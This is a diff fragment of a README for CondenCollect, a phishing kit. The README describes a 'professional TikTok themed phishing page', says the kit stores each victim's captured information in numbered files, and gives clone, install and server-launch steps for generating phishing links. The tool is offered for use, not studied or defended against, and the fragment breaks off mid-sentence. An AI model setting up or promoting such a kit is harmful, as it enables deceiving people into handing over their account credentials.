@@ -39,23 +39,23 @@ Automatically creates a Data folder and stores each client’s information in fi
 Client 1.txt  
 Client 2.txt  
 Client 3.txt
-
 ### Realistic Template  
 Includes a professional TikTok themed phishing page.
 
-## Installation
 
-Run these commands:
+## Installation
 
 git clone https://github.com/juttcybertech/CondenCollect
 cd CondenCollect
 pip install -r requirements.txt
 
+
 ## Usage
 
 Start the server:
 
-python app.py
+
+
 
 A menu will appear. Choose a phishing template such as TikTok.  
 The server will show a link for example:
